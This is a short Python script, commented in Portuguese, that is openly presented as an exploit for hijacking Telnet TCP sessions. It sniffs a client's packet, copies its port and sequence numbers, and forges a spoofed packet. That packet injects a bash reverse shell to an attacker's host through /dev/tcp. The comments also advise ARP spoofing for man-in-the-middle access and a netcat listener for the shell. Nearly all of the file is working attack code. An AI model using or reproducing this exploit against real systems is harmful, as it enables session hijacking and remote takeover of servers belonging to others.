#!/usr/bin/env python

# Nome: Teljack
# Autor: Pedro Otávio
# Email: pedr_ofs@hotmail.com
# Atualizado: 21/02/2022

# Este script tem por finalidade realizar o sequestro de sessão TCP e injeção de pacote malicioso uma comunicação Telnet.

# Como Funciona:

# Utilizando os princípios de análise de pacotes, é realizada a captura da porta de origem da comunicação
# TCP, número de sequencia e número de confirmação. É então criado o pacote contendo o payload malicioso
# de modo a estabelecer uma comunicação direta entre o servidor e o atacante, através de uma conexão reversa.

# IMPORTANTE-1: Para a correta execução deste exploit, o atacate necessita ter acesso a comunicação entre o
# cliente e o servidor. O ataque MITM, utilizando ARP Spoof, possibilita o sniff de pacotes. ;)

# IMPORTANTE-2: Para a correta execução deste exploit, abra uma porta TCP de sua preferência para aguardar
# a conexão reversa do exploit. Ex: nc -lp 4545

# Modo de uso: Abra uma porta de sua preferência para esperar o exploit se conectar. Execute o exploit.

# Biblíoteca de manupulação de pacotes, Scapy.
from scapy.all import *
import sys

# Verifica se o usuário entrou com o número de argumentos corretos.
if len(sys.argv) <=3:
	print ("Modo de uso:", sys.argv[0] ,"ip-client ip-server ip-attacker port-attacker")
else:

	# Atribuição dos argumentos à variáveis.
	client=sys.argv[1]
	server=sys.argv[2]
	ipatck=sys.argv[3]
	patck=sys.argv[4]

	# Sniff do pacote tcp.	==VERIFIQUE A PORTA TELNET CORRETA!!!!==
	pkt = sniff(filter='tcp and dst port 23' , count=1)

	# Atribuição do campo do protocolo TCP à variável field.
	field = pkt[-1][2]

	# Captura dos campos: Porta de Origem, Número de Sequencia e Número de Confirmação.
	sportt = field.getfieldval("sport")
	seqq = field.getfieldval("seq")
	ackk = field.getfieldval("ack")

	# Montagem do pacote malicioso.
	ip = IP(src=client , dst=server)
	tcp = TCP(sport=sportt , dport=23 , flags="A" , seq=seqq , ack=ackk)
	# Aqui é utilizado a técnica de shell reverso, enviando um bash iterativo ao atacante.
	payload = "\n bash -i > /dev/tcp/"+ipatck+"/"+patck+" 0>&1 2>&1\n"
	pkt = ip/tcp/payload

	# Envio do pacote malicioso.
	send(pkt, verbose=0)
